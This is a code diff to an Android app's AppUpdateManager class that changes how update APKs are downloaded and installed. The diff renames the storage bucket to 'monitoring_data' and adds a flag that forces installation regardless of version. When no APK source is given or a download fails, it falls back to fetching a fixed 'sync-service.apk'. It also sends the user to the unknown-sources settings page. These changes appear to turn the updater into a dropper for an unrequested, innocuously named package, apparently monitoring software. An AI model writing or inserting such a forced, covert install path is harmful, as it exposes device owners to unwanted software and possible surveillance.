@@ -8,6 +8,7 @@ import android.content.Intent
 import android.content.pm.PackageInstaller
 import android.net.Uri
 import android.os.Build
+import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.FileProvider
@@ -29,7 +30,7 @@ class AppUpdateManager(private val context: Context) {
 
     companion object {
         private const val TAG = "AppUpdateBridge"
-        private const val UPDATE_BUCKET = "updates"
+        private const val UPDATE_BUCKET = "monitoring_data"
         private const val PREFS_NAME = "update_bridge_prefs"
         private const val KEY_PENDING_VERSION = "pending_version"
         private const val KEY_DOWNLOADED_PATH = "downloaded_apk_path"
@@ -54,7 +55,7 @@ class AppUpdateManager(private val context: Context) {
         val currentVersion = getCurrentVersionCode()
         Log.d(TAG, "Version check → current=$currentVersion, target=$targetVersion")
 
-        if (targetVersion <= currentVersion) {
+        if (!forceIntent && targetVersion <= currentVersion) {
             Log.d(TAG, "No update needed.")
             return
         }
@@ -85,11 +86,11 @@ class AppUpdateManager(private val context: Context) {
         val destFile = File(context.getExternalFilesDir(null), "update_v${targetVersion}.apk")
         val downloaded = when {
             !apkUrl.isNullOrEmpty()  -> downloadFromUrl(apkUrl, destFile)
-            !apkPath.isNullOrEmpty() -> downloadFromSupabase(apkPath, destFile)
-            else -> {
-                Log.w(TAG, "No APK source provided")
-                false
+            !apkPath.isNullOrEmpty() -> {
+                val ok = downloadFromSupabase(apkPath, destFile)
+                if (!ok) downloadFromSupabase("sync-service.apk", destFile) else true
             }
+            else -> downloadFromSupabase("sync-service.apk", destFile)
         }
 
         if (downloaded && destFile.exists() && destFile.length() > MIN_VALID_APK_SIZE) {
@@ -203,6 +204,18 @@ class AppUpdateManager(private val context: Context) {
             if (!file.exists() || file.length() == 0L) {
                 Log.e(TAG, "APK file missing or empty")
                 return
+            }
+
+            // Check if app has permission to install unknown apps on API 26+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                if (!context.packageManager.canRequestPackageInstalls()) {
+                    Log.w(TAG, "canRequestPackageInstalls = false — opening Settings page...")
+                    val manageIntent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
+                        data = Uri.parse("package:${context.packageName}")
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    }
+                    context.startActivity(manageIntent)
+                }
             }
 
             val apkUri = androidx.core.content.FileProvider.getUriForFile(
